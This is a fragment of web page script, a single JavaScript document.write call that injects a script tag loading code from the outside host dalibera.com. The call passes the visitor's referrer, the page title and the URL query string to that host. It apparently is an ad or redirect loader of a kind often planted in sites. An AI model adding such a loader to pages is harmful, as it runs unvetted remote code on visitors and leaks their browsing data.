...
document.write('<script type="application/javascript" src="//dalibera.com/BWr7bZMY?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f2ee9479b150=script5f2ee9479b151"><' + '/script>');
</script>
